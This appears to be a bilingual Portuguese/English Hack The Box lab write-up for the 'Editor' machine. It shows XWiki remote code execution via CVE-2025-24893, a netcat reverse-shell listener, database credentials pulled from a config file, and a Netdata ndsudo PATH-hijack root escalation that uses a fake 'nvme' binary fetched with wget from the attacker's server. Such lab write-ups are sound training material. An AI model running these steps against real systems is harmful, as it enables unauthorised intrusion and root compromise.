# Editor HTB - Writeup

## Escaneamento de portas

``` bash
./malwaricon.sh
Enter domain: 10.10.11.80
...
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
8080/tcp open  http    Jetty 10.0.20
9999/tcp open  abyss?
```

...

## Exploração do CVE-2025-24893 (XWiki RCE)

Foi encontrado o CVE: https://github.com/Artemir7/CVE-2025-24893-EXP

Execução bem-sucedida:

``` bash
python CVE-2025-24893.py -u http://wiki.editor.htb -c whoami
[+] Command Output:
xwiki
```

Reverse shell enviada:

``` bash
nc -lvnp 4444
```

## Credenciais do banco de dados

No arquivo `/etc/wiki/hibernate.cfg.xml` foram encontradas credenciais:

    username: xwiki
    password: theEd1t0rTeam99

## Acesso inicial como Oliver

``` bash
oliver@editor:~$ cat user.txt
2739c3049d79c4f20eff7db04ea331f7
```

## Escalada de privilégios via Netdata

A porta 19999 estava rodando **Netdata**. Após abrir um túnel SSH e
acessar a interface web, foi identificado que a versão era vulnerável ao
CVE-2024-32019.

Exploração com binário falso `nvme`:

``` bash
wget http://10.10.15.14:5000/nvme
chmod +x nvme
```

------------------------------------------------------------------------

------------------------------------------------------------------------

# Editor HTB - Writeup (English)

## Port Scan

``` bash
nmap -sV 10.10.11.80
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
8080/tcp open  http    Jetty 10.0.20
9999/tcp open  abyss?
```

## Exploitation of CVE-2025-24893 (XWiki RCE)

Found CVE: https://github.com/Artemir7/CVE-2025-24893-EXP

Successful execution:

``` bash
python CVE-2025-24893.py -u http://wiki.editor.htb -c whoami
[+] Command Output:
xwiki
```

Reverse shell payload:

``` bash
nc -lvnp 4444
```

## Database credentials

Found in `/etc/wiki/hibernate.cfg.xml`:

    username: xwiki
    password: theEd1t0rTeam99

## Initial access as Oliver

``` bash
oliver@editor:~$ cat user.txt
2739c3049d79c4f20eff7db04ea331f7
```

## Privilege Escalation via Netdata

Running `sudo -l` showed that Oliver does not have permission to run any command as root 

After inspecting local ports, I noticed that port `19999` is used by **Netdata**, a monitoring tool. I created an SSH tunnel:

``` bash
ssh -L 19999:127.0.0.1:19999 oliver@10.10.11.80
```
The fist thing i saw after enter to the web was

The
 moment I opened the Netdata web page, a big warning showed up saying 
the version was outdated — a great hint that it might be vulnerable.

https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93?source=post_page-----2128149b1929---------------------------------------

This vulnerability affects the `ndsudo` binary that ships with Netdata. It allows a **Local Privilege Escalation (LPE)** by exploiting an insecure `PATH` environment variable.

We can create a fake `nvme` binary, which gets executed instead of the real one when `ndsudo` tries to call `nvme-list`.

This operation is clearly demonstrated in the PoC by [AliElKhatteb](https://github.com/AliElKhatteb):
------------------------------------------------------------------------
```
󰣇 ~/Documentos/editorhtb ❯ python3 -m http.server 5000
Serving HTTP on 0.0.0.0 port 5000 (http://0.0.0.0:5000/) ...
10.10.11.80 - - [10/Aug/2025 21:04:14] "GET /nvme HTTP/1.1" 200 -
```
```
oliver@editor:~$ wget http://10.10.15.14:5000/nvme
--2025-08-11 00:03:42--  http://10.10.15.14:5000/nvme
Connecting to 10.10.15.14:5000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 782800 (764K) [application/octet-stream]
Saving to: ‘nvme’

nvme                             100%[=========================================================>] 764.45K   394KB/s    in 1.9s    

2025-08-11 00:03:45 (394 KB/s) - ‘nvme’ saved [782800/782800]
```
```
oliver@editor:~$ chmod +x /tmp/nvme
oliver@editor:~$ export PATH=/tmp:$PATH
oliver@editor:~$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list

root@editor:/home/oliver# id
uid=0(root) gid=0(root) groups=0(root),999(netdata),1000(oliver)

root@editor:/home/oliver# cat /root/root.txt
99b89e8afa5...
root@editor:/home/oliver#

```
